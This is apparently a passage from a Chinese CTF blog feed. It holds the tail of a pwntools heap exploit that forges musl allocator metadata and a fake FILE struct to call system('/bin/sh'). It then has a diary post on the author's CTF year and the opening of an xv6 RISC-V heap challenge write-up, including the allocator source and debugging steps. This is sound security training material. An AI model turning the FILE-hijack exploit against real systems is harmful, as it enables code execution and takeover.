class="line">last_idx = <span class="number">0</span></span><br><span class="line">maplen = <span class="number">1</span></span><br><span class="line">fake_meta = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_meta += p64(stdout - <span class="number">0x18</span>) <span class="comment"># prev</span></span><br><span class="line">fake_meta += p64(fake_meta_addr + <span class="number">0x30</span>) <span class="comment"># next</span></span><br><span class="line">fake_meta += p64(fake_mem_addr) <span class="comment"># mem</span></span><br><span class="line">fake_meta += p32(<span class="number">0</span>) + p32(<span class="number">0</span>) <span class="comment"># avail_mask, freed_mask</span></span><br><span class="line">fake_meta += p64((maplen &lt;&lt; <span class="number">12</span>) | (sc &lt;&lt; <span class="number">6</span>) | (freeable &lt;&lt; <span class="number">5</span>) | last_idx)</span><br><span class="line">fake_meta += p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">fake_mem = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_mem += p64(fake_meta_addr) <span class="comment"># meta</span></span><br><span class="line">fake_mem += p32(<span class="number">1</span>) <span class="comment"># active_idx</span></span><br><span class="line">fake_mem += p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0xaa0</span></span><br><span class="line">payload += p64(secret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += fake_meta</span><br><span class="line">payload += fake_mem</span><br><span class="line">payload += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(payload, <span class="number">0x1200</span>)</span><br><span class="line">store(<span class="string">b&#x27;A&#x27;</span>, p64(<span class="number">0</span>) + p64(fake_mem_addr + <span class="number">0x10</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x7e5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">delete(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将该fake meta进入active队列</span></span><br><span class="line">sc = <span class="number">8</span> <span class="comment"># 0x90</span></span><br><span class="line">last_idx = <span class="number">1</span></span><br><span class="line">fake_meta = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_meta += p64(<span class="number">0</span>) <span class="comment"># prev</span></span><br><span class="line">fake_meta += p64(<span class="number">0</span>) <span class="comment"># next</span></span><br><span class="line">fake_meta += p64(fake_mem_addr) <span class="comment"># mem</span></span><br><span class="line">fake_meta += p32(<span class="number">0</span>) + p32(<span class="number">0</span>) <span class="comment"># avail_mask, freed_mask</span></span><br><span class="line">fake_meta += p64((sc &lt;&lt; <span class="number">6</span>) | last_idx)</span><br><span class="line">fake_meta += p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">fake_mem = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_mem += p64(fake_meta_addr) <span class="comment"># meta</span></span><br><span class="line">fake_mem += p32(<span class="number">1</span>) <span class="comment"># active_idx</span></span><br><span class="line">fake_mem += p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0xa90</span></span><br><span class="line">payload += p64(secret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += fake_meta</span><br><span class="line">payload += fake_mem</span><br><span class="line">payload += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line">query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(payload, <span class="number">0x1200</span>)</span><br><span class="line">store(<span class="string">b&#x27;A&#x27;</span>, p64(<span class="number">0</span>) + p64(fake_mem_addr + <span class="number">0x10</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x7e5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">delete(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改meta的mem区域指向stdout-0x10</span></span><br><span class="line">fake_meta = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_meta += p64(fake_meta_addr) <span class="comment"># prev</span></span><br><span class="line">fake_meta += p64(fake_meta_addr) <span class="comment"># next</span></span><br><span class="line">fake_meta += p64(stdout - <span class="number">0x10</span>) <span class="comment"># mem</span></span><br><span class="line">fake_meta += p32(<span class="number">1</span>) + p32(<span class="number">0</span>) <span class="comment"># avail_mask, freed_mask</span></span><br><span class="line">fake_meta += p64((sc &lt;&lt; <span class="number">6</span>) | last_idx)</span><br><span class="line">fake_meta += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x18</span></span><br><span class="line">fake_meta += p64(stdout - <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0xa80</span></span><br><span class="line">payload += p64(secret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += fake_meta</span><br><span class="line">payload += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">query(payload, <span class="number">0x1200</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入fake file</span></span><br><span class="line">fake_file = <span class="string">b&quot;&quot;</span></span><br><span class="line">fake_file += <span class="string">b&quot;/bin/sh&quot;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment"># flags</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rpos</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rend</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># close</span></span><br><span class="line">fake_file += p64(<span class="number">0x114514</span>)  <span class="comment"># wend</span></span><br><span class="line">fake_file += p64(<span class="number">0x114514</span>)  <span class="comment"># wpos</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># mustbezero_1</span></span><br><span class="line">fake_file += p64(<span class="number">0x114514</span>)  <span class="comment"># wbase</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># read</span></span><br><span class="line">fake_file += p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>])  <span class="comment"># write</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x80</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">store(<span class="string">b&#x27;A&#x27;</span>, fake_file, value_size=<span class="number">0x80</span>, wait=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://bbs.kanxue.com/thread-269533.htm">https://bbs.kanxue.com/thread-269533.htm</a><br><a href="https://www.anquanke.com/post/id/246929">https://www.anquanke.com/post/id/246929</a><br><a href="https://blog.csdn.net/qq_45323960/article/details/129800670">https://blog.csdn.net/qq_45323960&#x2F;article&#x2F;details&#x2F;129800670</a><br><a href="https://www.anquanke.com/post/id/241104#h2-3">https://www.anquanke.com/post/id/241104#h2-3</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2023小琐碎记录贴</title>
      <link href="/2023/12/27/2023%E5%B0%8F%E7%90%90%E7%A2%8E%E8%AE%B0%E5%BD%95%E8%B4%B4/"/>
      <url>/2023/12/27/2023%E5%B0%8F%E7%90%90%E7%A2%8E%E8%AE%B0%E5%BD%95%E8%B4%B4/</url>
      
        <content type="html"><![CDATA[<h2 id="2023-3-27"><a href="#2023-3-27" class="headerlink" title="2023&#x2F;3&#x2F;27"></a>2023&#x2F;3&#x2F;27</h2><p>加入<code>Sloth</code>咯！！！<br>上学期<code>XSCTF</code>联合招新赛爆<code>0</code>后就没有在<code>CTF</code>走下去的打算，可是寒假在暨大的<code>i_corner</code>师傅的鼓励下打算再努力一把，刷了<code>2</code>个多月的<code>Crypto</code>和<code>misc</code>，最后在选拔赛拿了全场一血(我最爱的RSA)，太感动了<code>QAQ</code><br>不过也感受到了差距，第一名和第二名是大二的学长，分数比我高好多，同级的也有一位逆向好厉害<code>QAQ</code><br>搏一搏，单车变摩托，我要超越他们！！！！</p><h2 id="2023-4-2"><a href="#2023-4-2" class="headerlink" title="2023&#x2F;4&#x2F;2"></a>2023&#x2F;4&#x2F;2</h2><p>正式开始学<code>pwn</code>了捏  </p><img src="/2023/12/27/2023%E5%B0%8F%E7%90%90%E7%A2%8E%E8%AE%B0%E5%BD%95%E8%B4%B4/1.png" class="" title="我的图图呢">  <h2 id="2023-5-28"><a href="#2023-5-28" class="headerlink" title="2023&#x2F;5&#x2F;28"></a>2023&#x2F;5&#x2F;28</h2><p>第一次打比赛，给打烂了捏&gt;_&lt;<br>打了一个月的<code>ret2libc</code>,才发现<code>pwn</code>原来还有这么多东西，看来要狠狠的卷了  </p><img src="/2023/12/27/2023%E5%B0%8F%E7%90%90%E7%A2%8E%E8%AE%B0%E5%BD%95%E8%B4%B4/2.png" class="" title="我的图图呢">  <h2 id="2023-8-26"><a href="#2023-8-26" class="headerlink" title="2023&#x2F;8&#x2F;26"></a>2023&#x2F;8&#x2F;26</h2><p>好耶，闭关一段时间再参加比赛(蓝帽杯)，出了一道堆题，成就感拉满！！！！！！</p><h2 id="2023-9-10"><a href="#2023-9-10" class="headerlink" title="2023&#x2F;9&#x2F;10"></a>2023&#x2F;9&#x2F;10</h2><p>数模国赛逆大天，首先是有<code>78w</code>行数据，脚本跑一次好好几分钟，其次是题目完全没有思路，找不到适用的模型<code>&gt;_&lt;</code>，完全靠队友带飞<code>Orz</code></p><h2 id="2023-10-15"><a href="#2023-10-15" class="headerlink" title="2023&#x2F;10&#x2F;15"></a>2023&#x2F;10&#x2F;15</h2><p>香山杯太亏了，差一点点(几分)进决赛，问题出在<code>pwn</code>手(我),<code>pwn</code>差一题<code>Ak</code>，剩下一题<code>python pwn</code>，漏洞出现在<code>python</code>程序调用的函数包，函数包用<code>C++</code>写的，存在格式化字符串漏洞和栈溢出，可是我本地启动不了程序，调试不了<code>QAQ</code>，血亏，我背锅。赛后发现要使用<code>python3.7</code>才可以启动程序，裂大开<br>后期补充：决赛<code>awdp</code>的<code>3</code>题<code>pwn</code>我都会做，没去线下太可惜了，哦对，我还没进过线下(卑微)</p><h2 id="2023-10-16"><a href="#2023-10-16" class="headerlink" title="2023&#x2F;10&#x2F;16"></a>2023&#x2F;10&#x2F;16</h2><p>XSCTF联合招新赛结束拉，嘿嘿，第一次出题(一道简单的libc-2.27的unlink)，居然没人做？完了，要给<code>JANlittle</code>拉去喂鱼了</p><img src="/2023/12/27/2023%E5%B0%8F%E7%90%90%E7%A2%8E%E8%AE%B0%E5%BD%95%E8%B4%B4/3.png" class="" title="我的图图呢">  <p>pwn的解题情况惨不忍睹，别后继无人啊QAQ(以后谁来带我)<br>133nson和Csome师兄出的<code>pwn</code>题质量是真的高，我要好好学习</p><h2 id="2023-11-9"><a href="#2023-11-9" class="headerlink" title="2023&#x2F;11&#x2F;9"></a>2023&#x2F;11&#x2F;9</h2><p>嘿嘿，<code>CS</code>杯选拔赛，欺负老实人<br>谁说算法只能用<code>C/C++</code>打的，上<code>python</code>！！！！！<br>4道题15分钟干了3题，而且2题一血，不过最后一题用深搜超时，到最后都没有做出来，哎，算法太烂了，而且好久没看了，人菜瘾大xD</p><h2 id="2023-12-9"><a href="#2023-12-9" class="headerlink" title="2023&#x2F;12&#x2F;9"></a>2023&#x2F;12&#x2F;9</h2><p>PolarCTF打爽了 Solved:24 grade:7000 rank:3<br>11题pwn全都会(有一题<code>house of orange</code>嫌麻烦且分不高没打，结果给<code>jelasin</code>师傅骂了<code>QAQ</code>)，还拿了题唯一血(预期解为改<code>printf</code>的格式表？不存在的，打<code>IO</code>才是<code>yyds</code>！！！)<br>Crypto全是脑洞题，没有数学题，差评QAQ，只会数学题&gt;_&lt;<br>有题逆向做出来后怎么交都是错，结束后才发现<code>flag</code>要进行<code>md5</code>加密，逆天(貌似题目上也没有说明XD)</p><h2 id="2023-12-10"><a href="#2023-12-10" class="headerlink" title="2023&#x2F;12&#x2F;10"></a>2023&#x2F;12&#x2F;10</h2><p>给<code>Csome</code>师兄拉去<code>S1uM4i</code>打<code>TCTF/0CTF</code>,坐大牢！！！题目过于逆天，连什么<code>ios kernel</code>都来了，感觉最少还要再练一年才能在这个比赛上做出题。<br>才大二，还来得及，冲！！！！</p><h2 id="2023-12-17"><a href="#2023-12-17" class="headerlink" title="2023&#x2F;12&#x2F;17"></a>2023&#x2F;12&#x2F;17</h2><p>强网杯太逆天了啊，学会了各种<code>io file</code>攻击以为可以乱杀，结果发现题目都是<code>VM</code>类型，完全看不懂逆向，看来<code>kernel</code>要延后一段时间再学了，先把<code>vmpwn</code>给拿下<br>比赛有点可惜，差一点进决赛<code>QAQ</code>，归根到底是我的问题，队友很<code>c</code>了，要是我能把那两题简单<code>pwn</code>做出来就能进决赛了(<code>WTOA</code>和<code>A-rtsp</code> 都是看不懂逆向，我的<code>500</code>分鸭<code>QAQ</code>)，寒假给我狠狠卷！！！！ 备战期末，这学期绩点必须给我高高高！！！！</p><img src="/2023/12/27/2023%E5%B0%8F%E7%90%90%E7%A2%8E%E8%AE%B0%E5%BD%95%E8%B4%B4/4.png" class="" title="我的图图呢">  <p>虽然很遗憾，不过也学到了怎么通过<code>puts</code>函数来调用<code>io</code>链，也算是一种所获吧，强网杯已经没有想进决赛的欲望了，太卷了<br>感觉<code>AFL fuzz</code>技术也要学学，在很多题目上都能用到</p><h2 id="2023-12-28"><a href="#2023-12-28" class="headerlink" title="2023&#x2F;12&#x2F;28"></a>2023&#x2F;12&#x2F;28</h2><p>好好好，上大学一年多，已经变成<code>IT</code>的形状了</p><img src="/2023/12/27/2023%E5%B0%8F%E7%90%90%E7%A2%8E%E8%AE%B0%E5%BD%95%E8%B4%B4/5.png" class="" title="我的图图呢">  <p>考完<code>java</code>放松的时候翻了一下上学期校队送的<code>《CTF权威指南 pwn篇》</code>,发现里面的内容确实基础和简单，不过当时买回来看的时候感觉在看天书，真属于是不会时看天书，会时用不上了<br>里面的很多堆利用手法都过时了，不过感觉依然可以作为一本很好很系统的<code>pwn</code>入门书籍，期末后看看能不能找到想学<code>pwn</code>的学弟，把这本书送他并天天督促他学<code>pwn</code>(已经有一位学<code>web</code>的学弟成为受害者了)，好书不能浪费(其实是怕以后没人带&gt;_&lt;)</p><h2 id="2024-1-1"><a href="#2024-1-1" class="headerlink" title="2024&#x2F;1&#x2F;1"></a>2024&#x2F;1&#x2F;1</h2><p>2023年过的太失败了，2024给我冲！！！我要变强！！！</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>记一道risc-v架构xv6操作系统的堆</title>
      <link href="/2023/11/18/%E8%AE%B0%E4%B8%80%E9%81%93risc-v%E6%9E%B6%E6%9E%84xv6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%A0%86/"/>
      <url>/2023/11/18/%E8%AE%B0%E4%B8%80%E9%81%93risc-v%E6%9E%B6%E6%9E%84xv6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%A0%86/</url>
      
        <content type="html"><![CDATA[<p>附件：<a href="https://github.com/Qanux/uheap">https://github.com/Qanux/uheap</a><br>这是一道<code>133nson</code>师兄出的题(太强啦),看了后只能说自己的见识还是太少了。<br>这一道是<code>xv6</code>系统的堆题，附件已经给出了一个完整的<code>qemu</code>环境，只要输入<code>./run.sh</code>即可启动程序<br>题目有一个<code>hint</code>文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">This challenge is running on the xv6 system. (Attention: its heap allocator is different from GLIBC)</span><br><span class="line">You can get the xv6 source files on https://github.com/mit-pdos/xv6-riscv</span><br><span class="line">You can run this challenge locally using the command &#x27;./run.sh&#x27; and your goal is to PWN the binary chal</span><br><span class="line">To make things simple, the binary file is compiled with debug_info and I have left its source code in chal.c. This means you can use qemu and gdb-multiarch(or other debuggers) for source level debugging if necessary. (You just need to add &#x27;-S -gdb tcp::26000&#x27; to the qemu parameter in the file run.sh then you can start gdb for local debugging)</span><br><span class="line">Here are some useful gdb commands. You can write them in the file .gdbinit and start gdb with the command &#x27;gdb-multiarch -x .gdbinit&#x27;</span><br><span class="line"></span><br><span class="line">target remote:26000</span><br><span class="line">set architecture riscv:rv64</span><br><span class="line">file chal</span><br><span class="line">set disassemble-next-line on</span><br><span class="line">layout src</span><br><span class="line"></span><br><span class="line">If you have any problem about the remote environment, please contact the admin. Have fun!</span><br></pre></td></tr></table></figure><p>由于<code>elf</code>文件是附带调试信息编译的，这大大方便了我们进行动态调试</p><h3 id="如何调试"><a href="#如何调试" class="headerlink" title="如何调试"></a>如何调试</h3><p>相信很多萌新还不知道怎么进行调试，这里就进行傻瓜式教学<br>首先在<code>github</code>上面下载<code>umalloc.c</code>文件(<code>hint</code>文件上写明了)，然后将该文件放入在和<code>chal</code>同一个路径下<br>然后将<code>run.sh</code>文件中的内容进行修改</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">LD_LIBRARY_PATH=./depend exec ./qemu-system-riscv64 \</span><br><span class="line">        -machine virt \</span><br><span class="line">        -bios none \</span><br><span class="line">        -kernel kernel \</span><br><span class="line">        -m 256M \</span><br><span class="line">        -smp 3 \</span><br><span class="line">        -nographic \</span><br><span class="line">        -drive file=fs.img,if=none,format=raw,id=x0 \</span><br><span class="line">        -device virtio-blk-device,drive=x0,bus=virtio-mmio-bus.0 \</span><br><span class="line">        -monitor /dev/null \</span><br><span class="line">        -S -gdb tcp::26000</span><br></pre></td></tr></table></figure><p>此时通过<code>./run.sh</code>来启动，然后再重新打开另外一个终端，进入到<code>chal</code>文件的路径下，通过<code>gdb-multiarch</code>，然后依次输入下面的命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">target remote:26000</span><br><span class="line">set architecture riscv:rv64</span><br><span class="line">file chal</span><br><span class="line">set disassemble-next-line on</span><br><span class="line">layout src</span><br><span class="line">b main</span><br><span class="line">c</span><br></pre></td></tr></table></figure><p>此时即可进行调试，不过我们不能向平时一样通过<code>bin</code>、<code>stack</code>这些指令来查看堆内存(其实我也不知道怎么看，请求大佬指教)，不过x<code>/16gx</code> 这一些基础的指令还是可以使用</p><h3 id="xv6堆管理分析"><a href="#xv6堆管理分析" class="headerlink" title="xv6堆管理分析"></a>xv6堆管理分析</h3><p>首先来看看<code>xv6</code>中的堆块长什么样</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> Align;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">header</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">union</span> <span class="title">header</span> *<span class="title">ptr</span>;</span></span><br><span class="line">        uint size;</span><br><span class="line">    &#125; s;</span><br><span class="line">    Align x;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到堆块的结构和我们平时<code>glibc</code>中的不一样，他没有<code>prev_size</code>，取而代之的是堆块的指针，我们可以猜到这个指针因该和我们的<code>fd</code>指针类似(储存在<code>free</code>后的链表中的下一个<code>free</code>的堆块的堆头的位置)<br>umalloc.c(<a href="https://github.com/mit-pdos/xv6-riscv">https://github.com/mit-pdos/xv6-riscv</a>)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/param.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Memory allocator by Kernighan and Ritchie,</span></span><br><span class="line"><span class="comment">// The C programming Language, 2nd ed.  Section 8.7.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> Align;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">header</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">header</span> *<span class="title">ptr</span>;</span></span><br><span class="line">    uint size;</span><br><span class="line">  &#125; s;</span><br><span class="line">  Align x;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">union</span> <span class="title">header</span> <span class="title">Header</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> Header base;</span><br><span class="line"><span class="type">static</span> Header *freep;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">free</span><span class="params">(<span class="type">void</span> *ap)</span></span><br><span class="line">&#123;</span><br><span class="line">  Header *bp, *p;</span><br><span class="line"></span><br><span class="line">  bp = (Header*)ap - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span>(p = freep; !(bp &gt; p &amp;&amp; bp &lt; p-&gt;s.ptr); p = p-&gt;s.ptr)</span><br><span class="line">    <span class="keyword">if</span>(p &gt;= p-&gt;s.ptr &amp;&amp; (bp &gt; p || bp &lt; p-&gt;s.ptr))</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">if</span>(bp + bp-&gt;s.size == p-&gt;s.ptr)&#123;</span><br><span class="line">    bp-&gt;s.size += p-&gt;s.ptr-&gt;s.size;</span><br><span class="line">    bp-&gt;s.ptr = p-&gt;s.ptr-&gt;s.ptr;</span><br><span class="line">  &#125; <span class="keyword">else</span></span><br><span class="line">    bp-&gt;s.ptr = p-&gt;s.ptr;</span><br><span class="line">  <span class="keyword">if</span>(p + p-&gt;s.size == bp)&#123;</span><br><span class="line">    p-&gt;s.size += bp-&gt;s.size;</span><br><span class="line">    p-&gt;s.ptr = bp-&gt;s.ptr;</span><br><span class="line">  &#125; <span class="keyword">else</span></span><br><span class="line">    p-&gt;s.ptr = bp;</span><br><span class="line">  freep = p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> Header*</span><br><span class="line"><span class="title function_">morecore</span><span class="params">(uint nu)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *p;</span><br><span class="line">  Header *hp;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(nu &lt; <span class="number">4096</span>)</span><br><span class="line">    nu = <span class="number">4096</span>;</span><br><span class="line">  p = sbrk(nu * <span class="keyword">sizeof</span>(Header));</span><br><span class="line">  <span class="keyword">if</span>(p == (<span class="type">char</span>*)<span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  hp = (Header*)p;</span><br><span class="line">  hp-&gt;s.size = nu;</span><br><span class="line">  <span class="built_in">free</span>((<span class="type">void</span>*)(hp + <span class="number">1</span>));</span><br><span class="line">  <span class="keyword">return</span> freep;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>*</span><br><span class="line"><span class="title function_">malloc</span><span class="params">(uint nbytes)</span></span><br><span class="line">&#123;</span><br><span class="line">  Header *p, *prevp;</span><br><span class="line">  uint nunits;</span><br><span class="line"></span><br><span class="line">  nunits = (nbytes + <span class="keyword">sizeof</span>(Header) - <span class="number">1</span>)/<span class="keyword">sizeof</span>(Header) + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span>((prevp = freep) == <span class="number">0</span>)&#123;</span><br><span class="line">    base.s.ptr = freep = prevp = &amp;base;</span><br><span class="line">    base.s.size = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span>(p = prevp-&gt;s.ptr; ; prevp = p, p = p-&gt;s.ptr)&#123;</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;s.size &gt;= nunits)&#123;</span><br><span class="line">      <span class="keyword">if</span>(p-&gt;s.size == nunits)</span><br><span class="line">        prevp-&gt;s.ptr = p-&gt;s.ptr;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        p-&gt;s.size -= nunits;</span><br><span class="line">        p += p-&gt;s.size;</span><br><span class="line">        p-&gt;s.size = nunits;</span><br><span class="line">      &#125;</span><br><span class="line">      freep = prevp;</span><br><span class="line">      <span class="keyword">return</span> (<span class="type">void</span>*)(p + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p == freep)</span><br><span class="line">      <span class="keyword">if</span>((p = morecore(nunits)) == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们侧重看一下堆块大小的计算</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nunits = (nbytes + <span class="keyword">sizeof</span>(Header) - <span class="number">1</span>)/<span class="keyword">sizeof</span>(Header) + <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>大概就是原本的堆块大小减一加上一个堆头结构的大小后除以堆头的大小再向上取整（比如申请<code>0x19</code>大小的堆块计算出的<code>size</code>为<code>3</code>，申请<code>0x30</code>的堆块计算出的<code>size</code>为<code>4</code>）</p><h4 id="malloc函数"><a href="#malloc函数" class="headerlink" title="malloc函数"></a>malloc函数</h4><p>在<code>malloc</code>函数中，先根据申请的堆块计算出相应的堆块大小，若<code>free</code>链表的表头为<code>0</code>（<code>free</code>链表尚未初始化，则会将静态全局变量<code>base</code>的地址赋值给<code>free</code>的表头指针<code>freep</code>）。然后会从<code>prevp-&gt;s.ptr</code>（表头后的第一个堆块指针）开始顺着<code>s.ptr</code>遍历<code>free</code>链表，若遇到比待申请的堆块大小大的堆块，则会直接切分该堆块，将前一部分返回，后一部分留在链表内；若遇到<code>size</code>刚好符合需求的，则将其脱链后直接返回；若遍历完整个链表仍未遇到可以进行分配的<code>free</code>堆块，则会调用<code>morecore</code>函数向系统申请更多的内存。</p><h4 id="free函数"><a 